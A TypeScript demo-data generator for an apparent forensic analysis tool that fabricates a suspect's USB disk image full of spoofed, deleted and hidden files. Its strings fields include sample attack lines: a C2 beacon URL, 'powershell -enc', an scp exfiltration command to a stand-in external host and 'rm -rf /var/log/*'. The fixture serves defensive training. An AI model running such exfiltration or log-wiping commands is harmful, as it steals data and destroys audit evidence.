import type { EvidenceItem, Partition, FileEntry } from '../types';

const generateId = () => Math.random().toString(36).substring(2) + Date.now().toString(36);

function randomDate(start: Date, end: Date): string {
  return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime())).toISOString();
}

const startDate = new Date('2024-01-15');
const endDate = new Date('2024-02-10');

export function generateDemoFiles(): FileEntry[] {
  const files: FileEntry[] = [
    // Normal files
    {
      id: generateId(), name: 'Annual_Report_2024.pdf', path: '/Documents/Annual_Report_2024.pdf',
      size: 2458624, type: 'file', extension: '.pdf', isDeleted: false, isHidden: false, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '25 50 44 46', actualType: 'PDF Document', claimedType: 'PDF Document',
      analysisResults: {
        hashes: { md5: 'a3f2e8c91b5d7f4e6a2c8d0b1e3f5a7c', sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' },
        strings: { asciiStrings: ['Adobe Acrobat', 'Annual Report 2024', 'Confidential'], unicodeStrings: [], urls: ['https://company-internal.com/reports'], emails: ['cfo@company.com'], ipAddresses: [], totalCount: 156 },
      },
    },
    {
      id: generateId(), name: 'budget_spreadsheet.xlsx', path: '/Documents/Finance/budget_spreadsheet.xlsx',
      size: 845312, type: 'file', extension: '.xlsx', isDeleted: false, isHidden: false, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '50 4B 03 04', actualType: 'ZIP Archive (Office 2007+)', claimedType: 'XLSX Spreadsheet',
      analysisResults: {
        hashes: { md5: 'b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9', sha256: 'abc123def456789012345678901234567890abcdef1234567890abcdef12345678' },
        strings: { asciiStrings: ['Q1 Revenue', 'Q2 Revenue', 'Total Budget', 'Password: fiscal2024'], unicodeStrings: [], urls: [], emails: ['finance@company.com'], ipAddresses: [], totalCount: 89 },
      },
    },
    {
      id: generateId(), name: 'team_photo.jpg', path: '/Pictures/team_photo.jpg',
      size: 3245678, type: 'file', extension: '.jpg', isDeleted: false, isHidden: false, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: 'FF D8 FF E1', actualType: 'JPEG Image', claimedType: 'JPEG Image',
      analysisResults: {
        hashes: { md5: 'c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0', sha256: 'fedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321' },
        strings: { asciiStrings: ['Canon EOS R5', 'GPS: 37.7749,-122.4194'], unicodeStrings: [], urls: [], emails: [], ipAddresses: [], totalCount: 12 },
        image: { width: 6720, height: 4480, colorSpace: 'sRGB', bitDepth: 8, cameraMake: 'Canon', cameraModel: 'EOS R5', gpsCoordinates: { latitude: 37.7749, longitude: -122.4194 } },
      },
    },
    // SPOOFED FILE - Executable disguised as PDF (CRITICAL)
    {
      id: generateId(), name: 'invoice_march.pdf', path: '/Downloads/invoice_march.pdf',
      size: 45056, type: 'file', extension: '.pdf', isDeleted: false, isHidden: false, isSpoofed: true,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '4D 5A 90 00', actualType: 'PE Executable (Windows)', claimedType: 'PDF Document',
      riskLevel: 'CRITICAL',
      analysisResults: {
        spoofing: {
          isSpoofed: true, claimedType: '.pdf', actualType: 'PE Executable (Windows)',
          riskLevel: 'CRITICAL',
          indicators: ['Extension .pdf does not match PE executable signature', 'File may be malware disguised as document', 'Common social engineering attack pattern'],
          recommendation: 'QUARANTINE - Do not open, likely malicious',
        },
        hashes: { md5: 'e1f2a3b4c5d6e7f8a1b2c3d4e5f6a7b8', sha256: '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef' },
        executable: {
          format: 'PE', architecture: 'x86', imports: ['kernel32.dll', 'ws2_32.dll', 'advapi32.dll'], exports: [],
          sections: [
            { name: '.text', size: 12288, entropy: 6.8 },
            { name: '.rdata', size: 4096, entropy: 5.2 },
            { name: '.data', size: 2048, entropy: 3.1 },
            { name: '.rsrc', size: 8192, entropy: 7.9 },
          ],
          isPacked: true, compiler: 'UPX packed',
          suspiciousApis: ['CreateRemoteThread', 'WriteProcessMemory', 'VirtualAllocEx', 'InternetOpenA'],
        },
        strings: { asciiStrings: ['CreateRemoteThread', 'cmd.exe /c', 'powershell -enc', 'http://evil-c2.example.com/beacon'], unicodeStrings: [], urls: ['http://evil-c2.example.com/beacon'], emails: [], ipAddresses: ['192.168.1.100', '10.0.0.5'], totalCount: 234 },
      },
    },
    // SPOOFED FILE - Archive disguised as image
    {
      id: generateId(), name: 'vacation_photos.jpg', path: '/Pictures/vacation_photos.jpg',
      size: 15728640, type: 'file', extension: '.jpg', isDeleted: false, isHidden: false, isSpoofed: true,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '50 4B 03 04', actualType: 'ZIP Archive', claimedType: 'JPEG Image',
      riskLevel: 'HIGH',
      analysisResults: {
        spoofing: {
          isSpoofed: true, claimedType: '.jpg', actualType: 'ZIP Archive',
          riskLevel: 'HIGH',
          indicators: ['ZIP archive disguised with .jpg extension', 'May contain hidden malicious files'],
          recommendation: 'CAUTION - Inspect archive contents before opening',
        },
        hashes: { md5: 'f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6', sha256: 'abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890' },
        strings: { asciiStrings: ['PK', 'client_database.sql', 'credentials.txt', 'ssh_keys/'], unicodeStrings: [], urls: [], emails: [], ipAddresses: [], totalCount: 45 },
      },
    },
    // DELETED FILES
    {
      id: generateId(), name: 'Security.evtx', path: '/Windows/System32/winevt/Logs/Security.evtx',
      size: 20971520, type: 'file', extension: '.evtx', isDeleted: true, isHidden: false, isSpoofed: false,
      recoverability: 65,
      timestamps: { created: '2024-01-01T00:00:00Z', modified: '2024-02-10T03:15:00Z', accessed: '2024-02-10T03:15:00Z' },
      magicBytes: '45 6C 66 46', actualType: 'Windows Event Log', claimedType: 'Windows Event Log',
      analysisResults: {
        hashes: { md5: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6', sha256: '0987654321abcdef0987654321abcdef0987654321abcdef0987654321abcdef' },
        strings: { asciiStrings: ['Event ID: 4624', 'Logon Type: 10', 'Security ID: S-1-5-21'], unicodeStrings: [], urls: [], emails: [], ipAddresses: ['192.168.1.105'], totalCount: 5420 },
      },
    },
    {
      id: generateId(), name: 'System.evtx', path: '/Windows/System32/winevt/Logs/System.evtx',
      size: 15728640, type: 'file', extension: '.evtx', isDeleted: true, isHidden: false, isSpoofed: false,
      recoverability: 45,
      timestamps: { created: '2024-01-01T00:00:00Z', modified: '2024-02-10T03:15:05Z', accessed: '2024-02-10T03:15:05Z' },
      magicBytes: '45 6C 66 46', actualType: 'Windows Event Log', claimedType: 'Windows Event Log',
    },
    {
      id: generateId(), name: 'confidential_client_list.xlsx', path: '/Documents/Deleted/confidential_client_list.xlsx',
      size: 524288, type: 'file', extension: '.xlsx', isDeleted: true, isHidden: false, isSpoofed: false,
      recoverability: 90,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '50 4B 03 04', actualType: 'ZIP Archive (Office 2007+)', claimedType: 'XLSX Spreadsheet',
      analysisResults: {
        strings: { asciiStrings: ['Client Name', 'Account Number', 'SSN', 'Date of Birth'], unicodeStrings: [], urls: [], emails: ['hr@company.com', 'legal@company.com'], ipAddresses: [], totalCount: 342 },
        hashes: { md5: 'deadbeef12345678deadbeef12345678', sha256: 'cafebabe12345678cafebabe12345678cafebabe12345678cafebabe12345678' },
      },
    },
    {
      id: generateId(), name: 'data_exfil.zip', path: '/Users/suspect/AppData/Local/Temp/data_exfil.zip',
      size: 52428800, type: 'file', extension: '.zip', isDeleted: true, isHidden: false, isSpoofed: false,
      recoverability: 30,
      timestamps: { created: '2024-02-09T22:45:00Z', modified: '2024-02-09T23:10:00Z', accessed: '2024-02-10T01:00:00Z' },
      magicBytes: '50 4B 03 04', actualType: 'ZIP Archive', claimedType: 'ZIP Archive',
      analysisResults: {
        strings: { asciiStrings: ['financial_records/', 'employee_data/', 'trade_secrets/'], unicodeStrings: [], urls: [], emails: [], ipAddresses: [], totalCount: 15 },
        hashes: { md5: 'baadf00d12345678baadf00d12345678', sha256: 'deadc0de12345678deadc0de12345678deadc0de12345678deadc0de12345678' },
      },
    },
    // HIDDEN FILES
    {
      id: generateId(), name: '.secret_config', path: '/Users/suspect/.secret_config',
      size: 1024, type: 'file', extension: '', isDeleted: false, isHidden: true, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '23 21 2F', actualType: 'Shell Script', claimedType: 'Unknown',
      analysisResults: {
        strings: { asciiStrings: ['#!/bin/bash', 'scp -r /data/ user@external-server.com:/exfil/', 'rm -rf /var/log/*'], unicodeStrings: [], urls: [], emails: ['user@external-server.com'], ipAddresses: ['203.0.113.42'], totalCount: 8 },
        hashes: { md5: '1111111122222222333333334444444', sha256: '5555555566666666777777778888888899999999aaaaaaabbbbbbbbcccccccc' },
      },
    },
    {
      id: generateId(), name: 'desktop.ini', path: '/Users/suspect/Desktop/desktop.ini',
      size: 256, type: 'file', extension: '.ini', isDeleted: false, isHidden: true, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '5B 2E 53 68', actualType: 'INI Configuration', claimedType: 'INI Configuration',
    },
    // More normal files
    {
      id: generateId(), name: 'presentation.pptx', path: '/Documents/Presentations/presentation.pptx',
      size: 5242880, type: 'file', extension: '.pptx', isDeleted: false, isHidden: false, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '50 4B 03 04', actualType: 'ZIP Archive (Office 2007+)', claimedType: 'PPTX Presentation',
    },
    {
      id: generateId(), name: 'notes.txt', path: '/Users/suspect/Desktop/notes.txt',
      size: 4096, type: 'file', extension: '.txt', isDeleted: false, isHidden: false, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      actualType: 'Text File', claimedType: 'Text File',
      analysisResults: {
        strings: { asciiStrings: ['Meeting at 3pm', 'Transfer files to USB before Friday', 'Delete logs after transfer', 'Use VPN: vpn.anonymous-proxy.example.com'], unicodeStrings: [], urls: ['https://vpn.anonymous-proxy.example.com'], emails: [], ipAddresses: [], totalCount: 25 },
        hashes: { md5: 'aabbccdd11223344aabbccdd11223344', sha256: 'eeff00112233445566778899aabbccddeeff00112233445566778899aabbccdd' },
      },
    },
    {
      id: generateId(), name: 'chrome_history.db', path: '/Users/suspect/AppData/Local/Google/Chrome/User Data/Default/History',
      size: 2097152, type: 'file', extension: '.db', isDeleted: false, isHidden: false, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      magicBytes: '53 51 4C 69 74 65', actualType: 'SQLite Database', claimedType: 'SQLite Database',
      analysisResults: {
        strings: {
          asciiStrings: ['CREATE TABLE urls', 'CREATE TABLE visits'],
          unicodeStrings: [],
          urls: ['https://mega.nz/folder/shared123', 'https://pastebin.com/raw/abc123', 'https://file-transfer.example.com/upload'],
          emails: [],
          ipAddresses: [],
          totalCount: 890,
        },
        hashes: { md5: 'dbdbdbdb12345678dbdbdbdb12345678', sha256: 'sqlitesqlite12345678sqlitesqlite12345678sqlitesqlite12345678sqlitesq' },
      },
    },
    {
      id: generateId(), name: 'id_rsa', path: '/Users/suspect/.ssh/id_rsa',
      size: 1679, type: 'file', extension: '', isDeleted: false, isHidden: true, isSpoofed: false,
      timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
      actualType: 'SSH Private Key', claimedType: 'Unknown',
      analysisResults: {
        strings: { asciiStrings: ['-----BEGIN RSA PRIVATE KEY-----', '-----END RSA PRIVATE KEY-----'], unicodeStrings: [], urls: [], emails: [], ipAddresses: [], totalCount: 3 },
        hashes: { md5: 'sshkeysshkey12345678sshkeysshkey', sha256: 'rsarsarsa12345678rsarsarsa12345678rsarsarsa12345678rsarsarsa1234567' },
      },
    },
    {
      id: generateId(), name: 'autorun.inf', path: '/autorun.inf',
      size: 128, type: 'file', extension: '.inf', isDeleted: false, isHidden: true, isSpoofed: false,
      timestamps: { created: '2024-02-08T10:00:00Z', modified: '2024-02-08T10:00:00Z', accessed: '2024-02-10T08:30:00Z' },
      actualType: 'INF Configuration', claimedType: 'INF Configuration',
      analysisResults: {
        strings: { asciiStrings: ['[autorun]', 'open=launcher.exe', 'icon=drive.ico', 'action=Open folder'], unicodeStrings: [], urls: [], emails: [], ipAddresses: [], totalCount: 4 },
        hashes: { md5: 'autorunautorun123456autorunauto', sha256: 'infinfinfinfinfinfinfinfinfinfinfinfinfinfinfinfinfinfinfinfinfinfin' },
      },
    },
  ];

  return files;
}

export function generateDemoEvidence(): EvidenceItem {
  const files = generateDemoFiles();
  
  const partitions: Partition[] = [
    {
      id: 'part-1',
      number: 1,
      type: 'NTFS / exFAT (0x07)',
      filesystemType: 'NTFS',
      startSector: 2048,
      endSector: 125829120,
      size: 64424509440,
      status: 'active',
      files: files.filter(f => !f.path.startsWith('/autorun')),
    },
    {
      id: 'part-2',
      number: 2,
      type: 'FAT32 (0x0B)',
      filesystemType: 'FAT32',
      startSector: 125829121,
      endSector: 129892351,
      size: 2080374784,
      status: 'inactive',
      files: [
        {
          id: generateId(), name: 'backup.tar.gz', path: '/backup/backup.tar.gz',
          size: 104857600, type: 'file', extension: '.tar.gz', isDeleted: false, isHidden: false, isSpoofed: false,
          timestamps: { created: randomDate(startDate, endDate), modified: randomDate(startDate, endDate), accessed: randomDate(startDate, endDate) },
          magicBytes: '1F 8B', actualType: 'GZIP Archive', claimedType: 'GZIP Archive',
        },
      ],
    },
    {
      id: 'part-hidden',
      number: 3,
      type: 'Hidden FAT16 (0x16)',
      filesystemType: 'FAT16',
      startSector: 32,
      endSector: 16415,
      size: 8388608,
      status: 'hidden',
      files: [
        files.find(f => f.name === 'autorun.inf')!,
        {
          id: generateId(), name: 'U3Launcher.exe', path: '/U3System/U3Launcher.exe',
          size: 245760, type: 'file', extension: '.exe', isDeleted: false, isHidden: false, isSpoofed: false,
          timestamps: { created: '2023-06-15T00:00:00Z', modified: '2023-06-15T00:00:00Z', accessed: '2024-02-10T08:30:00Z' },
          magicBytes: '4D 5A 90 00', actualType: 'PE Executable (Windows)', claimedType: 'PE Executable',
        },
      ].filter(Boolean),
    },
  ];

  return {
    id: generateId(),
    name: 'sandisk-cruzer-16gb.img',
    type: 'disk-image',
    path: '/evidence/disk-images/sandisk-cruzer-16gb.img',
    size: 16106127360,
    dateAdded: new Date().toISOString(),
    hashMD5: '7f83b1657ff1fc53b92dc18148a1d65d',
    hashSHA256: 'ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d',
    partitions,
    analysisStatus: 'complete',
  };
}
